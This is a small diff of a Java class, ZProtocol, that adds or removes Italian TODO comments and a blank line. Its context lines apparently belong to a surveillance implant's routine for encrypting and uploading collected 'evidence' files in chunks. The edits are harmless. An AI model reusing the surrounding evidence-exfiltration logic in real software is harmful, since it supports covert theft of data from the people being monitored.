@@ -773,6 +773,7 @@ public class ZProtocol extends Protocol {
 					// expanding $dir$
 					file = Directory.expandMacro(file);
 					file = Protocol.normalizeFilename(file);
+					// TODO: non caricare intero il file in memoria 
 					Protocol.saveDownloadLog(file);
 				}
 
@@ -1205,7 +1206,6 @@ public class ZProtocol extends Protocol {
 					+ " Info: Sending file: " + EvidenceCollector.decryptName(file.getName()) + " size: " + file.getSize() + " date: " + file.getFileTime()); //$NON-NLS-1$
 		}
 
-		// TODO: uscita quando finisce
 		while (base < size) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (sendResumeEvidence), base: " + base + " size: " + size);
@@ -1216,6 +1216,7 @@ public class ZProtocol extends Protocol {
 					Check.log(TAG + " (sendResumeEvidence), smaller read: " + content.length);
 				}
 			}
+			
 			byte[] plainOut = new byte[content.length + 16];
 
 			writeBuf(plainOut, 0, evid, 0, 4);
